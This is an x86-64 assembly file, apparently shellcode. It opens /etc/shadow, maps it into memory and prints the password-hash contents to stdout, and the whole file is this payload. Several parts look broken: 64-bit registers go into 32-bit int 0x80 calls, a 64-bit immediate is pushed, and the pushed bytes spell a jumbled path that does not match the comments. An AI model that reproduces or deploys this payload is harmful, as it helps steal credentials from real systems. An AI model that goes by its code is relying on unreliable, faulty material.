section .text
	global _start

_start:

; open

xor rax, rax
xor rcx, rcx ; zeroing rax, rcx and rdx, so they don't induce error
cdq

mov al, 5 ; putting the number 5 in rax

push rcx ; puts 0x00000000 on the stack
push 0x68732f2f776f6461 ; writes /etc//shadow, on the contrary, because the stack is a LIFO system
push 0x6374652f ; LIFO = last-in first-out, first-in last-out

mov rbx, rsp

int 0x80 ; execute the system call

; fstat64

mov rbx, rax ; move the result of the system call 'open' into rbx
mov al, 197  ; fstat64
mov rcx, rsp ; moves the address from rsp into rcx

int 0x80

; mmap2

mov rcx, [ rsp+44 ] ; 0x3f4 - file size
mov al,	192 ; mmap2 system call	number
mov rdi, rbx ; move the fd into edi

xor rbx, rbx
xor rdx, rdx
xor rbp, rbp
inc rdx ; PROT_READ

push byte 2 ; MAP_PRIVATE
pop rsi

int 0x80

; write

mov rdx, rcx ; move the file size into rdx
mov rcx, rax ; move the result of mmap2 into rcx

xor rax, rax
mov al, 4; sys_write
inc rbx; 1 = stdout

int 0x80

; close

xor rax, rax
mov al, 6; sys_close
mov rbx, rdi

int 0x80
